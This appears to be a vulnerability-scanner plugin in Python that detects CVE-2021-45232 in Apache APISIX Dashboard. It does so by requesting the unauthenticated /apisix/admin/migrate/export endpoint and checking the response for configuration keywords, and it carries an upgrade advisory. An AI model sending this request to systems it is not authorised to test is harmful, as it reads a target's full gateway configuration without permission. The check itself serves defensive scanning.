#!/usr/bin/env python3
# coding=utf-8

"""
title: CVE-2021-45232: Apache APISIX Dashboard unauth
published: 2021-12-28 19:53:00
link: https://cert.360.cn//warning/detail?id=a96ebf4b0ace65d061b0d897eb39866b
diff: https://github.com/apache/apisix-dashboard/compare/v2.10...v2.10.1#diff-4372e69d1e5940bf2aa6aed26f370959e839dcfc771ada70da65ea7257766f39
"""
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    url = "{}://{}:{}/apisix/admin/migrate/export".format(service, ip, port)

    try:
        r = await http_client(ip, port).get(url, headers={'User-Agent': GLOBAL_USER_AGENT}, timeout=10)

        key_words = ["Upstreams", "GlobalPlugins", "PluginConfigs", "Routes", "Consumers"]
        if all([i in r.text for i in key_words]) and r.status_code == 200:
            ret = {
                "alert_group": "API Six Dashboard Unauthorized Access",
                "details": u"API Six 未授权的API: /apisix/admin/migrate/export; /apisix/admin/migrate/import\n" +
                           u"会导致系统被入侵, 需要升级至2.10.1及以上",
                "affects": "{}://{}:{}".format(service, ip, port)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9000, 'http', True, task_msg={})
    run_plugin_test(scan)
